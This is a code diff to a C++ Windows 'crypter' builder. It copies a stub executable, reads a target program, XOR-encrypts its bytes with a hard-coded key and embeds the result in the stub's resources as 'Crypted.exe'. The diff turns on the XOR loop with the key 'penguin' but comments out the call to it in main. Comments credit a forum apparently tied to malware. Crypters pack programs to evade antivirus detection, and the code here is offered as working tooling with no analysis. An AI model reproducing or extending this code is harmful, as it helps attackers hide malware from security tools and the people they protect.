@@ -1,5 +1,6 @@
 #include <iostream>
 #include <Windows.h>
+#include <fstream>
 using namespace std;
 
 char * FB; //The Buffer that will store the File's data
@@ -19,7 +20,7 @@ void RDF() //The Function that Reads the File and Copies the stub
 	CopyFile(L"stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
 	// ofcourse we can just update the resources with new data but whatever
 	cout << "\nGetting the HANDLE of the file to be crypted\n";
-	HANDLE efile = CreateFile(name, WRITE_DAC | WRITE_OWNER | GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE efile = CreateFile(name, WRITE_DAC | WRITE_OWNER | GENERIC_ALL , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	//^ Get the handle of the file to be crypted
 	cout << "Getting the File size\n";
 	fs = GetFileSize(efile, NULL);
@@ -36,10 +37,13 @@ void RDF() //The Function that Reads the File and Copies the stub
 void enc() // The function that Encrypts the info on the FB buffer
 {
 	cout << "Encrypting the Data\n";
-	char cipher[] = "cipher";
-	//for (int i = 0; i < fs; i++)
-	//	FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
+	char cipher[] = "penguin";
+	for (int i = 0; i < fs; i++)
+	{
+		FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
+	}
 }
+
 void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
 {
 	// Thanks to DigitalNemesis and Grigori Perelman  From www.OpenSC.ws
@@ -52,7 +56,7 @@ void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) /
 int main() // The main function (Entry point)
 {
 	RDF();//Read the file
-	enc();//Encrypt it 
+	//enc();//Encrypt it 
 	WriteToResources(output/*L"Crypted.exe"*/, 1, (BYTE *)FB, fs);//Write the encrypted data to resources
 	cout << "Your File Got Crypted\n";
 	system("PAUSE");
